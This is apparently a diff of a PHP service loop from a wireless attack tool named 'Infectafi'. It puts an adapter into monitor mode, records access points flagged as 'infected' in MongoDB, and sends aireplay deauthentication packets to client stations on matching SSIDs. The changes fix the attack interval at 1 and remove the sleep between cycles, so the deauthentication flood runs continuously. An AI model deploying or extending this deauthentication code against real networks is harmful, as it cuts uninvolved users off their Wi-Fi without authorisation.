@@ -32,17 +32,17 @@ foreach ($opts as $key => $value) {
 Debug::log(Debug::LOG_DEBUG, 'Service Config: ' . json_encode($config));
 
 while (true) {
-	$start = new DateTime();
-
 	Debug::log(Debug::LOG_DEBUG, 'Starting service cycle...');
 
 	// Setup database connection and database
 	$mongoClient = new MongoDB\Client($config->db->url);
 	Db::setMongoClientAndDb($mongoClient, $config->db->name);
 
-	Debug::log(Debug::LOG_DEBUG, 'Starting monitor on ' . $config->adapter);
+	Debug::log(Debug::LOG_DEBUG, 'Starting monitor on ' . $config->attack->adapter->name);
 
-	Debug::log(Debug::LOG_DEBUG, \Spidermatt\Infectafi\Airmon::startMonitor($config->adapter));
+	Debug::log(Debug::LOG_DEBUG, \Spidermatt\Infectafi\Airmon::startMonitor($config->attack->adapter->name, $config->attack->adapter->useAirmon));
+
+	$start = new DateTime();
 
 	Debug::log(Debug::LOG_INFO, 'Attack Start: ' . ($startString = $start->format('Y-m-d H:i:s.u')));
 
@@ -57,10 +57,13 @@ while (true) {
 			if(isset($ap['infected']) && $ap['infected'])
 			{
 				$infectedAPs[] = $ap['bssid'];
-				$infectedSSIDs[] = $ap['essid'];
-				Debug::log(Debug::LOG_TRACE3, 'AP ' . $ap->bssid . ' is infected.');
+
+				if(($hasSSID = strlen(trim($ap['essid'])) > 0))
+					$infectedSSIDs[] = $ap['essid'];
+
+				Debug::log(Debug::LOG_TRACE3, 'AP ' . ($hasSSID ? $ap['essid'] : '(No SSID)') . ' (' . $ap->bssid . ') is infected.');
 			} else {
-				Debug::log(Debug::LOG_TRACE3, 'AP ' . $ap->bssid . ' is not infected.');
+				Debug::log(Debug::LOG_TRACE3, 'AP ' . ($hasSSID ? $ap['essid'] : '(No SSID)') . ' (' . $ap->bssid . ') is not infected.');
 			}
 		}
 
@@ -92,7 +95,11 @@ while (true) {
 
 		foreach(Db::getKnownAccessPointsCollection()->find() as $ap)
 		{
-			Debug::log(Debug::LOG_TRACE3, 'Searching for SSID cross-contamination for ' . $ap['essid']);
+			if(!strlen(trim($ap['essid']))) continue;
+
+			Debug::log(Debug::LOG_TRACE3, 'Enforcing SSID cross-contamination policy for ' . $ap['essid']
+				. ' (' . $ap['bssid'] . ')');
+
 			if ((!isset($ap['infected']) || !$ap['infected'])
 				&& in_array($ap['essid'], $infectedSSIDs)) {
 
@@ -116,10 +123,15 @@ while (true) {
 
 							Debug::log(Debug::LOG_INFO, 'Sending deauth packet to ' . $station['macAddress'] . ' associated to ' . $station['bssid']);
 
-							Debug::log(Debug::LOG_DEBUG, \Spidermatt\Infectafi\Aireplay::sendDeauth($station['bssid'], $station['macAddress'], $config->adapter));
+							$deauthResult = \Spidermatt\Infectafi\Aireplay::sendDeauth($station['bssid'],
+								$station['macAddress'], $config->attack->adapter->name
+								. ($config->attack->adapter->useAirmon ? 'mon' : ''));
+
+							Debug::log(Debug::LOG_DEBUG, $deauthResult);
 
 							$station['lastAttack'] = (new DateTime())->format('Y-m-d H:i:s.u');
-							$station['attackInterval'] = rand($config->attack->intervalFloor, $config->attack->intervalCeiling);
+							//$station['attackInterval'] = rand($config->attack->intervalFloor, $config->attack->intervalCeiling);
+							$station['attackInterval'] = 1;
 
 							Debug::log(Debug::LOG_TRACE3, 'Updating station ' . $station['macAddress'] . ' in database');
 							Db::getKnownStationsCollection()->updateOne(['macAddress' => $station['macAddress']], ['$set' => $station]);
@@ -137,13 +149,13 @@ while (true) {
 			}
 		}
 
-		Debug::log(Debug::LOG_TRACE2, "Sleeping for 1 second");
-		sleep(1);
+		//Debug::log(Debug::LOG_TRACE2, "Sleeping for 1 second");
+		//sleep(1);
 	}
 
-	Debug::log(Debug::LOG_DEBUG, 'Stopping monitor on ' . $config->adapter);
+	Debug::log(Debug::LOG_DEBUG, 'Stopping monitor on ' . $config->attack->adapter->name . ($config->attack->adapter->useAirmon ? 'mon' : ''));
 
-	Debug::log(Debug::LOG_DEBUG, \Spidermatt\Infectafi\Airmon::stopMonitor($config->adapter));
+	Debug::log(Debug::LOG_DEBUG, \Spidermatt\Infectafi\Airmon::stopMonitor($config->attack->adapter->name . ($config->attack->adapter->useAirmon ? 'mon' : ''), $config->attack->adapter->useAirmon));
 
 	Debug::log(Debug::LOG_DEBUG, 'Completed service cycle.');
 
